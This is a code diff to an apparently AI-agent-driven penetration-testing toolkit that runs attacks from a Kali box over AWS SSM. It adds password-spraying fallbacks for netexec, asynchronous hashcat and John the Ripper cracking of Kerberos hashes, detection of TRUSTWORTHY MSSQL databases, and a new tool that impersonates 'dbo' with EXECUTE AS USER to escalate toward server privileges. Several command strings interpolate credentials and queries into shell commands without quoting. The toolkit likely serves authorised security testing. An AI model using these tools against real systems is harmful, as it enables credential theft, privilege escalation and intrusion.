@@ -6,6 +6,7 @@ password cracking, share pilfering, and golden ticket generation.
 All tools execute commands remotely on the Kali attack box via AWS SSM.
 """
 
+import asyncio
 import json
 import logging
 import re
@@ -110,6 +111,23 @@ def _write_users_file_remote(users: list[str], users_file: str) -> tuple[bool, s
         error = (result.stderr or result.stdout or "unknown error").strip()
         return False, error
     return True, ""
+
+
+def _remote_file_exists(path: str) -> tuple[bool, str]:
+    cmd = f"test -s {shlex.quote(path)}"
+    result = run_remote(["bash", "-lc", cmd], timeout_seconds=30)
+    if result.return_code == 0:
+        return True, ""
+    error = (result.stderr or result.stdout or "file not found").strip()
+    return False, error
+
+
+def _find_remote_users_file(paths: list[str]) -> str | None:
+    for path in paths:
+        ok, _ = _remote_file_exists(path)
+        if ok:
+            return path
+    return None
 
 
 class NetworkEnumerationTools(Toolset):
@@ -921,8 +939,16 @@ class CredentialDiscoveryTools(Toolset):
                 logger.info(f"[*] No users file provided, auto-enumerating from {target}")
                 enumerated_file = self._enumerate_users_to_file(target)
                 if not enumerated_file:
-                    return "[!] Failed to enumerate users and no users_file provided. Try save_users_to_file first."
-                users_file = enumerated_file
+                    fallback = _find_remote_users_file(["/tmp/users.txt", "/tmp/users_auto.txt"])  # nosec B108 # noqa: S108
+                    if not fallback:
+                        return (
+                            "[!] Failed to enumerate users and no users_file provided. "
+                            "Try save_users_to_file first."
+                        )
+                    logger.info(f"[*] Using existing users file on remote: {fallback}")
+                    users_file = fallback
+                else:
+                    users_file = enumerated_file
 
             cmd = [
                 "netexec",
@@ -1059,8 +1085,16 @@ class CredentialDiscoveryTools(Toolset):
                 logger.info(f"[*] No users file provided, auto-enumerating from {target}")
                 enumerated_file = self._enumerate_users_to_file(target)
                 if not enumerated_file:
-                    return "[!] Failed to enumerate users and no users_file provided. Try save_users_to_file first."
-                users_file = enumerated_file
+                    fallback = _find_remote_users_file(["/tmp/users.txt", "/tmp/users_auto.txt"])  # nosec B108 # noqa: S108
+                    if not fallback:
+                        return (
+                            "[!] Failed to enumerate users and no users_file provided. "
+                            "Try save_users_to_file first."
+                        )
+                    logger.info(f"[*] Using existing users file on remote: {fallback}")
+                    users_file = fallback
+                else:
+                    users_file = enumerated_file
 
             # netexec's --no-bruteforce flag tests user1:user1, user2:user2, etc.
             cmd = [
@@ -1689,7 +1723,7 @@ class CrackingTools(Toolset):
         self.state = state
 
     @dn.tool_method
-    def crack_with_hashcat(
+    async def crack_with_hashcat(
         self,
         hash_value: str,
         hashcat_mode: int = 13100,
@@ -1733,7 +1767,8 @@ hashcat -m {hashcat_mode} -a 0 {hash_file_path} {wordlist_path} --runtime {max_t
 hashcat -m {hashcat_mode} {hash_file_path} --show 2>&1
 rm -f {hash_file_path}
 """
-            stdout, stderr, _ = _run_tool(
+            stdout, stderr, _ = await asyncio.to_thread(
+                _run_tool,
                 ["bash", "-c", cmd],
                 timeout_seconds=(max_time_minutes * 60) + 60,
             )
@@ -1750,7 +1785,7 @@ rm -f {hash_file_path}
             return output + f"\nError: {e!s}"
 
     @dn.tool_method
-    def crack_with_john(
+    async def crack_with_john(
         self,
         hash_value: str,
         hash_format: str = "krb5asrep",
@@ -1794,7 +1829,8 @@ john --wordlist={wordlist_path} --format={hash_format} {hash_file_path} --sessio
 john --show --format={hash_format} {hash_file_path} 2>&1
 rm -f {hash_file_path} {session_name}.pot {session_name}.rec {session_name}.log
 """
-            stdout, stderr, _ = _run_tool(
+            stdout, stderr, _ = await asyncio.to_thread(
+                _run_tool,
                 ["bash", "-c", cmd],
                 timeout_seconds=(max_time_minutes * 60) + 60,
             )
@@ -3797,7 +3833,12 @@ class MSSQLTools(Toolset):
             logger.info(f"[*] Testing MSSQL login to {target}")
             # Use a simple enumeration command - SQL is intentional for pentest tool
             # nosec B608 - intentional SQL for MSSQL pentest enumeration
-            sql_query = "SELECT name FROM master.sys.databases; SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
+            sql_query = (
+                "SELECT name FROM master.sys.databases; "
+                "SELECT name, is_trustworthy_on FROM sys.databases; "
+                "SELECT * FROM fn_my_permissions(NULL, 'SERVER'); "
+                "SELECT * FROM fn_my_permissions(NULL, 'DATABASE');"
+            )
             enum_cmd = f"echo '{sql_query}' | mssqlclient.py {target_string}"
             if windows_auth:
                 enum_cmd += " -windows-auth"
@@ -3808,6 +3849,11 @@ class MSSQLTools(Toolset):
             if "impersonate" in result.lower() or "control server" in result.lower():
                 logger.warning("[!] IMPERSONATION or CONTROL SERVER permission found!")
                 result = "🚨 IMPERSONATION POSSIBLE - Use mssql_impersonate next!\n\n" + result
+            if "is_trustworthy_on" in result.lower() and "1" in result:
+                result = (
+                    "🚨 TRUSTWORTHY DATABASE DETECTED - Check DB-level impersonation:\n"
+                    "→ Use mssql_execute_as_user with impersonate_user='dbo'\n\n" + result
+                )
 
             return result
 
@@ -3876,6 +3922,67 @@ class MSSQLTools(Toolset):
 
         except Exception as e:
             return f"xp_cmdshell failed: {e}"
+
+    @dn.tool_method
+    def mssql_execute_as_user(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        query: str,
+        database: str | None = None,
+        domain: str | None = None,
+        windows_auth: bool = True,
+        impersonate_user: str = "dbo",
+    ) -> str:
+        """
+        Execute a query as a database principal (EXECUTE AS USER).
+
+        Use when database-level impersonation is possible, especially with
+        TRUSTWORTHY databases, to escalate toward server-level privileges.
+
+        Args:
+            target: MSSQL server IP
+            username: Username for authentication
+            password: Password for authentication
+            query: SQL query to execute as the impersonated user
+            database: Database name to run the query against (optional)
+            domain: Domain for Windows auth
+            windows_auth: Use Windows authentication
+            impersonate_user: Database principal to impersonate (default: dbo)
+
+        Returns:
+            Query output
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        sql_commands = []
+        if database:
+            sql_commands.append(f"USE [{database}];")
+        sql_commands.append(f"EXECUTE AS USER = '{impersonate_user}';")
+        sql_commands.append(query)
+        sql_commands.append("REVERT;")
+        sql_script = " ".join(sql_commands)
+
+        cmd_string = f'echo "{sql_script}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(
+                "[*] Executing query as %s on %s (db=%s)",
+                impersonate_user,
+                target,
+                database or "default",
+            )
+            stdout, stderr, _ = _run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"mssql_execute_as_user failed: {e}"
 
     @dn.tool_method
     def mssql_enum_linked_servers(
